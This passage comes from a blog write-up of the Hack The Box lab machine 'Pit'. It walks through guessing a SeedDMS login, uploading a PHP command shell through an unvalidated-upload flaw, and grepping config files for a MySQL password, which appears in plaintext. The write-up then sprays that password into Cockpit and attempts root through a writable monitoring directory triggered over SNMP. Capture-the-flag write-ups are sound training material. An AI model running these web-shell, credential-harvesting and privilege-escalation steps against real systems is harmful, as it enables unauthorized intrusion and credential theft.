unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *


</code></pre></div><p>We managed to get a username michelle from ths output.</p>
<h2 id="seeddms">SeedDMS<a href="#seeddms" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Navigating to the directory from earlier it displays a new login page! (<a href="http://dms-pit.htb/seeddms51x/seeddms">http://dms-pit.htb/seeddms51x/seeddms</a>)</p>
<p><img src="/images/subdomainaccess.png" alt="subdomainaccess"></p>
<h4 id="what-is-seeddms">What is SeedDMS<a href="#what-is-seeddms" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<blockquote>
<p>SeedDMS is a free document management system with an easy to use web based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows.</p>
</blockquote>
<p>So lets try and log in with the usernames we found earlier on.</p>
<p><img src="/images/login.png" alt="login"></p>
<p>We are in! After many attempts trying to bruteforce with hydra i got a hint from someone who told me to think about common password insecurities. My initial thoughts were password re-use, or just generic insecure passwords, so i thought i would take a stab in the dark and try michelle as the password and it worked&hellip;</p>
<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>From some googling around it looks as though there was a command exec vulnerability with versions lower than 5.1.11 for SeedDms.</p>
<p>From some looking around on the dashboard it looks like the admin left a note that they have patched this vulnerability. However, there isnt really much more i can do with the dashboard if its higher than 5.1.15 so i am going to give it a try anyway.</p>
<p>The CVE is . And the issue arises due to unvalidated upload of PHP scripts. Looks like we could get a simple reverse shell.</p>
<p>But first we need to be able to upload a script. Looking through the folders i found Michelles&rsquo;s working directory which we have write privileges to. Good start.</p>
<p><img src="/images/workingdir.png" alt="workingdir"></p>
<p>Looks like we can upload documents!</p>
<p>Once uploaded we need to hit where the document gets stored to execute the script. From some googling it looks as though it uploads all files into /data/1048576/<em>Id</em>/1.php directory. It assigns each new document a unique file ID and renames it to 1.php. I tested this out in a local version i mde. I spun up a docker container which allwowed me to confirm it sits under the /seeddms51x directory meaning the full url would be <a href="http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=pwd">http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=pwd</a>.</p>
<p>When we upload the file we can find its ID so we are able to get our code execution.</p>
<p><img src="/images/idenum.png" alt="idenum"></p>
<p><img src="/images/rce.png" alt="rce"></p>
<h2 id="shell">Shell<a href="#shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>So i was struggling for a while with no luck in getting a shell retruned. Commands like curl, ping and wget were not showing any results. After testing to see if i was in a restricted shell i discovered the user (nginx) is using a /sbin/nologin shell which obviosuly means i won&rsquo;t be able to get a shell with this user.</p>
<p><img src="/images/nologin.png" alt="nologin"></p>
<p>After some searching around i found a password for the mysql database</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /seeddms51x/data/1048576/33/1.php?cmd<span style="color:#f92672">=</span>grep -r password<span style="color:#f92672">=</span> /var/www/html/seeddms51x HTTP/1.1

Host: dms-pit.htb
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:78.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>

/var/www/html/seeddms51x/data/mysql:password<span style="color:#f92672">=</span>ied^ieY6xoquu
</code></pre></div><p>Considering password reuse is a pretty common and terrible thing i decided to spray the mysql password i found across some other login pages and i successfully logged into the cockpit cms running on port 9090 with the Michelle user.</p>
<p><img src="/images/passwordspray.png" alt="passwordspray"></p>
<p>From my research i know that cockpit uses credentials from the server it sits on. Knowing this i tried to ssh in as the user but it has been disabled as i got access denied before i could enter the password.</p>
<p>However this is not a huge issue as the cockpit cms comes with a terminal feature where we can run commands.</p>
<p><img src="/images/cockpitcms.png" alt="cockpitcms"></p>
<h2 id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>After running Linpeas i saw there was an ACL set for the user michelle on the directory /usr/local/monitoring.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null
<span style="color:#75715e"># file: /usr/local/monitoring</span>
USER   root      rwx     
user   michelle  -wx     
GROUP  root      rwx     
mask             rwx     
other            --- 
</code></pre></div><p>We have write and execute permissions but not read.</p>
<p>In our SNMP reconnaissance from earlier there were multiple directories mentioned but one stood out.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/usr/bin/monitor&#34;</span>
</code></pre></div><p>This sounds related to our usr/local/monitoring directory.</p>
<p>If we take a look at the binary we found, it is a bash script which runs a binary called &ldquo;check*sh&rdquo; inside the /usr/local/monitoring directory (which we have write permissions to) with root privileges.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>michelle@pit ~<span style="color:#f92672">]</span>$ cat /usr/bin/monitor 
<span style="color:#75715e">#!/bin/bash</span>

<span style="color:#66d9ef">for</span> script in /usr/local/monitoring/check*sh
<span style="color:#66d9ef">do</span>
    /bin/bash $script
<span style="color:#66d9ef">done</span>
</code></pre></div><p>If we create our own bash script called &ldquo;check.sh&rdquo;, insert it into the /usr/local/monitoring directory and somehow execute the /usr/bin/monitor bash script, it should execute our bash script with elevated privileges.</p>
<p>After some enumeration of the box i couldnt seem to find a way to execute the binary so i started looking into whether i could execute binaries via SNMP.</p>
<p>I found this great article by <a href="https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/">Mogwai labs</a> The articled had some great information about how SNMP works. It had a reference to the red hat documentation (The distro of this vulnerable box) of how SNMP could be used to query bianries.</p>
<p>I picked out this quote &ldquo;The Net-SNMP Agent provides an extension MIB (NET-SNMP-EXTEND-MIB) that can be used to query arbitrary shell scripts. To specify the shell script to run, use the extend directive in the /etc/snmp/snmpd.conf file. Once defined, the Agent will provide the exit code and any output of the command over SNMP.&rdquo;</p>
<p>This sounds like exactly what we need. The write up by Mogwai labs included some steps to replicate this vulnerability that wasn&rsquo;t necessary for us. Their exploit included writing the binary to the vicitm with SNMP write privileges, but in our case the binary was already on the machine.</p>
<p>The documentation talks about some prerequisities that need to be in place before this will work like including a few lines in the snmpd.conf file specifying which binary you would like to be able to be executed via SNMP. This means not any bianry on the host can be executed only ones specified in the config, however this empahsises the importance of ensuring configurations are set correctly as they can lead to durastic consequnces such as this one.</p>
<p>There is a simple argument we need to run with snmp-walk to run any script configured in this way which is <code>bash NET-SNMP-EXTEND-MIB::nsExtendObjects</code></p>
<h3 id="poc">POC<a href="#poc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Lets put all this information into practice.</p>
<p><img src="/images/attemptatprivesc.png" alt="attemptatprivesc"></p>
<p>Steps:</p>
<ul>
<li>I created a malicious binary called check.sh to be ran by /usr/bin/monitor</li>
<li>I changed the check.sh binary permissions to be executeable by everyone</li>
<li>I moved the check.sh binary into /usr/local/monitoring</li>
<li>I ran the command below to execute the /usr/bin/monitor binary</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/pit<span style="color:#f92672">]</span>                                                                       
└─$ snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre></div><p>From the console output when i ran that command it outputs the binary it is about to execute here</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">1</span>                                                             
NET-SNMP-EXTEND-MIB::nsExtendCommand.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> STRING: /usr/bin/monitor                                       
NET-SNMP-EXTEND-MIB::nsExtendArgs.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> STRING:                                                           
NET-SNMP-EXTEND-MIB::nsExtendInput.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> STRING:                                                          
NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">5</span>                                                   
NET-SNMP-EXTEND-MIB::nsExtendExecType.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> INTEGER: exec<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                              
NET-SNMP-EXTEND-MIB::nsExtendRunType.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> INTEGER: run-on-read<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                        
NET-SNMP-EXTEND-MIB::nsExtendStorage.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> INTEGER: permanent<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>                                          
NET-SNMP-EXTEND-MIB::nsExtendStatus.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> INTEGER: active<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                              
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> STRING: Memory usage                                       
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span style="color:#e6db74">&#34;monitoring&#34;</span> <span style="color:#f92672">=</span> STRING: Memory usage
</code></pre></div><p>and then the result below here</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Login Name           SELinux User         MLS/MCS Range   Service                                               
__default__          unconfined_u         s0-s0:c0.c1023       *                                                   
michelle             user_u               s0                   *                                                   
root                 unconfined_u         s0-s0:c0.c1023       *                                                   
/bin/bash: /usr/local/monitoring/check.sh: Permission denied 
</code></pre></div><p>We got a permission denied with our POC. If we try something simple like ls -la /root lets see if we can figure out what the problem is.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dr-xr-x---.  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">225</span> May <span style="color:#ae81ff">10</span> 11:07 .                                                                        
drwxr-xr-x. <span style="color:#ae81ff">17</span> root root <span style="color:#ae81ff">224</span> May <span style="color:#ae81ff">10</span> 10:56 ..                                                                       
lrwxrwxrwx.  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">10</span> 10:56 .bash_history -&gt; /dev/null                                               
-??????????  ? ?    ?      ?            ? .bash_logout                                                             
-??????????  ? ?    ?      ?            ? .bash_profile                                                            
-??????????  ? ?    ?      ?            ? .bashrc                                                                  
-??????????  ? ?    ?      ?            ? cleanup.sh                                                               
drwx------.  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">20</span> Apr <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2020</span> .config                                                                  
-??????????  ? ?    ?      ?            ? .cshrc                                                                   
drwx------.  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">122</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> monitoring                                                               
lrwxrwxrwx.  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">10</span> 10:56 .mysql_history -&gt; /dev/null                                              
lrwxrwxrwx.  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">9</span> May <span style="color:#ae81ff">10</span> 11:07 null -&gt; /dev/null                                                        
-??????????  ? ?    ?      ?            ? root.txt                                                                 
drwx------.  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">29</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> .ssh                                                                     
-??????????  ? ?    ?      ?            ? .tcshrc   
</code></pre></div><p>So it looks like for some private files like cleanup.sh and root.txt no one has access?</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
